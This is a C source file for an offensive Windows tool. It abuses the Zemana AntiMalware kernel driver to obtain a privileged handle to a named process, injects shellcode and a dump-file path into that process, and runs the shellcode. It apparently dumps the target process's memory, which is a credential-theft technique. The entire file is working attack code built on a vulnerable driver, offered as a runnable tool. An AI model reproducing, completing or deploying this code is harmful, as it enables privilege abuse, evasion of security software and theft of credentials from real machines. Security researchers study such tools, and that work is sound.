#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include <dbghelp.h>
#include "shellcode.x64.h"
#include "mlwrfox.h"
#include "util.h"

void usage(char ** argv)
{
	printf("Usage: %s [-p process] [-o dumpfile]\n", argv[0]);
	ExitProcess(0);
};

int main(int argc, char **argv)
{
  DWORD pid, opid, sclen, tid;
  PCHAR pname, outpath;
  HANDLE hDriver, privHandle, hThread;
  LPVOID pMemory, pStrMem;

  while ( (argc > 1) && (argv[1][0] == '-') )
  {
	  switch(argv[1][1])
	  {
		  case 'p':
			  ++argv;
			  --argc;
			  pname = strdup(argv[1]);
		          break;
		  case 'o':
			  ++argv;
			  --argc;
			  outpath = strdup(argv[1]);
			  break;
		  default:
			  usage(argv);
			  break;
	  };

	  ++argv;
	  --argc;
  };

  if ((pid = LocateProcess(pname)) != 0)
  {
	  printf("[+] Found %s with PID %i\n", pname, pid);

	  hDriver = CreateFileA("\\\\.\\ZemanaAntiMalware",
			  GENERIC_READ | GENERIC_WRITE,
			  0,
			  NULL,
			  OPEN_EXISTING,
			  FILE_ATTRIBUTE_NORMAL,
			  NULL);

	  if ( hDriver != INVALID_HANDLE_VALUE )
	  {
		  opid = GetCurrentProcessId();
		  if ( RegisterProcess(hDriver, &opid) )
		  {
			  printf("[+] registered process successfully\n");
		  } else {
			  printf("[ ] failed to register current process\n");
			  goto Cleanup;
		  };

		  if ( AcquireHandle(hDriver, &pid, &privHandle) )
		  {
			  printf("[+] stole privileged handle %p to %i\n", privHandle, pid);

			  pMemory = VirtualAllocEx(
				privHandle,
				NULL,
				sizeof(buf),
				MEM_COMMIT,
				PAGE_EXECUTE_READWRITE
		          );
			  pStrMem = VirtualAllocEx(
				privHandle,
				NULL,
				strlen(outpath) + 1,
				MEM_COMMIT,
				PAGE_READWRITE
			  );

			  WriteProcessMemory(
				privHandle,
				pMemory,
				buf,
				sizeof(buf),
				NULL
			  );
			  WriteProcessMemory(
				privHandle,
				pStrMem,
				outpath,
				strlen(outpath) + 1,
				NULL
			  );

			  LocateThread(hDriver, pid, pMemory, pStrMem);
Finish:
			  VirtualFree(pMemory, 0, MEM_RELEASE);
			  VirtualFree(pStrMem, 0, MEM_RELEASE);

		  } else { 
			  printf("[ ] failed to steal handle to %s\n", pname);
			  goto Cleanup;
		  };
	  } else {
		  printf("[ ] zam.sys not registered :(?\n");
	  };
  } else {
	  printf("[ ] %s not found :(\n", pname);
  };

Cleanup:
  if ( privHandle != NULL )
	  CloseHandle(privHandle);
  if ( hThread != NULL )
	  CloseHandle(hThread);

  return -1;
};
